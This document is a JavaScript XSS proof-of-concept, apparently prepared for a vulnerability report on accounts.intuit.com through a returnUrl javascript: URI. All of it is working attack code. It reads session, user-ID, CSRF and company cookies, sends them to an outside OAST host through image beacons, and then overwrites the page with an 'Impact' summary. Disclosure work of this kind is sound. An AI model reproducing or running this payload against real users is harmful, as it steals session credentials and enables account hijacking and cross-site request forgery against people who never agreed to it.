(async function(){
var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';

function gc(n){
var m=document.cookie.match(new RegExp('(?:^|;\\s*)'+n.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+'=([^;]*)'));
return m?decodeURIComponent(m[1]):''
}

var cookies=document.cookie;
var sid=gc('ius_session');
var userId=gc('userIdentifier');
var vid=gc('ivid');
var csrf=gc('qbo.csrftoken');
var company=gc('qbo.currentcompanyid');
var uidp=gc('qbn.uidp');
var glogin=gc('qbn.glogin');

(new Image).src=O+'/cookie-exfil?session='+encodeURIComponent(sid)+'&uid='+encodeURIComponent(userId)+'&csrf='+encodeURIComponent(csrf)+'&company='+encodeURIComponent(company);

(new Image).src=O+'/full-cookies?c='+encodeURIComponent(cookies);

var rows=[
['ius_session (Session ID)',sid],
['userIdentifier (User ID)',userId],
['qbn.uidp (User Principal)',uidp],
['qbn.glogin (Global Login)',glogin],
['ivid (Visitor ID)',vid],
['qbo.csrftoken (CSRF Token)',csrf],
['qbo.currentcompanyid (Company)',company],
['Total cookies length',cookies.length+' chars']
];

var tableHtml=rows.map(function(r){
return '<tr><td style="color:#0ff;padding:6px 12px">'+r[0]+'</td><td style="color:#ff0;padding:6px 12px;word-break:break-all">'+(r[1]||'<span style="color:#666">not set</span>')+'</td></tr>'
}).join('');

document.body.innerHTML='<div style="font:14px monospace;background:#0a0a0a;color:#0f0;padding:30px;min-height:100vh">'
+'<div style="background:#1a0000;border:2px solid #f00;padding:20px;margin-bottom:20px;border-radius:8px">'
+'<h1 style="color:#f00;margin:0 0 5px">XSS — Cookie Exfiltration PoC</h1>'
+'<p style="color:#f88;margin:0">accounts.intuit.com | via returnUrl javascript: URI</p></div>'
+'<div style="background:#001a00;border:1px solid #0f0;padding:15px;border-radius:8px;margin-bottom:20px">'
+'<h2 style="color:#0f0;margin:0 0 10px">Exfiltrated Cookies (sent to attacker OAST)</h2>'
+'<table style="border-collapse:collapse;width:100%">'+tableHtml+'</table></div>'
+'<div style="background:#1a1a00;border:1px solid #ff0;padding:15px;border-radius:8px">'
+'<h2 style="color:#ff0;margin:0 0 10px">Impact</h2>'
+'<ul style="color:#ccc;line-height:1.8">'
+'<li>Session cookie (ius_session) is <b style="color:#f00">NOT HttpOnly</b> — readable via document.cookie</li>'
+'<li>User identifier exfiltrated — attacker knows victim user ID</li>'
+'<li>CSRF token stolen — enables cross-site request forgery</li>'
+'<li>Full session hijacking possible — attacker can replay cookies</li>'
+'<li>All '+cookies.length+' chars of cookies sent to attacker-controlled server</li>'
+'</ul></div></div>'
})();
